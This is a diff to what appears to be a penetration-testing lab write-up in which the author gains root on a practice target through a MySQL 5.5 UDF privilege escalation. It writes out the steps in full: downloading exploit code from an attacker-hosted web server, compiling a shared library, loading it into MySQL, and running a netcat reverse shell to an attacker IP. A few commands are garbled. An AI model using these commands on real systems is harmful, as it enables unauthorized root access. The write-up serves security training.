@@ -185,17 +185,81 @@ And found the location of Flag 3. Had to return to the web browser to read it ou
 
 ![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag3_CLEAN.jpg "Flag 3")
 
-Found 3 of the 4 target flags. Having found no sign of the 4th flag, the focus now turned to privilege escalation. Attempted to just switch to the root account. Was prompted for a password and unbelievably was able to guess the exact password.
+Found 3 of the 4 target flags. Having found no sign of the 4th flag, the focus now turned to privilege escalation. Searched & discovered that the Target is running MySQL version 5.5. At the time of this report, the lastest version of MySQL is 8.0. Performed a little searching & discovered a UDF (User Defined Function) Privilege Escalation exploit that works on mySQL 5.5 if it is running as the Root user. Checked the config file.
+
+```
+ps aux | root
+dpkg -l | grep mysql
+```
+
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_mysql_credentials_CLEAN.jpg "MySQL Credentials")
+
+Root again. For this UDF Privilege Escalation exploit to work, a command must be written in c code. The code is then compiled into a shared object which is similar to a library file. This si then read into the Database as raw binary. Because the MySQL service is running as Root, the data can be dumped into the correct directory for MySQL to use that command as an actual library. We can then create a function that uses that shared library & allows the attacking team to exploit it.
+
+Lets attempt it
+
+Pulled file 1518.c from the Exploit DB & renamed to `raptor_udf1.c`. Spun up a web server on the Kali machine & downloaded to the `/tmp` dir on target 2. 
+
+```
+kali
+python -c 'simpleHTTPServer 80'
+
+Target 2
+wget http://192.168.1.90/raptor_udf1.c
+```
+
+Now to compile. Since Target 2 is running a Debian/GNU OS & the attacking machine is a Kali Linux machine, the exploit cannot be compiled on the attacking machine if it is to work on the Target. In order for this to work, the exploit must be compiled, then loaded into the MySQL database as a root user. 
+
+Now to compile the code.
+
+```
+gcc -g -c raptor_udf1.c
+gcc -g -shared -Wl,-soname,raptor_udf1.so -o raptor_udf1.so raptor_udf1.c -lc -fPIC
+chmod 777 raptor_udf1.so
+```
+
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_compile.jpg "Compile the Exploit")
+
+After launching into the MySQL program, the following steps must be taken. Create a table, read the file into the table, move the contents into a dumpfile, then create a function. Also, verify where the plugin library is because this can vary.
+
+```
+use mysql;
+create table foo (line blob);
+insert into foo values(load_file('/tmp/raptor_udf1.so'));
+show variables like '%plugin%';
+select * from foo into dumpfile 'usr/lib/mysql/plugin/raptor_udf1.so';
+create function do_system returns integer soname 'raptor_udf1.so';
+select * from mysql.func;
+```
+
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_building_mysql_exploit.jpg "Build the exploit in MySQL")
+
+No errors. Time to run the exploit. Set up a listener on the Attacking Kali on port 4444 & ran the exploit in mysql
+
+```
+select do_system('nc 192.168.1.90 4444 -e /bin/bash &');
+```
+
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_priv_esc.jpg "Attempt the exploit")
+
+Success! Now export a shell, locate & Read out Flag 4
+
+```
+python -c 'import pty;pty.spawn ("/bin/bash")'
+export TERM=linux
+cd /root && ls
+cat flag4.txt
+```
+
+![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_root_shell_clean.jpg "Root shell & Flag 4")
+
+Confirmed root shell on both machines. However, due to the weak credentials previously found & the reuse of MySQL password, went to a lower shell & attempted to just switch to the root account. Was prompted for a password and unbelievably was able to guess the exact password.
 
 ![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_facepalm.jpg "OMG")
 
 The root password was as easy, if not easier, than guessing user michael's password from Target 1.
 
 ![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_su_root_clean.JPG "Switch to Root")
-
-And with that, it was easy to capture Flag 4.
-
-![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag4_clean.JPG "Flag 4")
 
 After guessing the root user password, went to check Target 1 & found the root user on Target 1 had the same password.
 
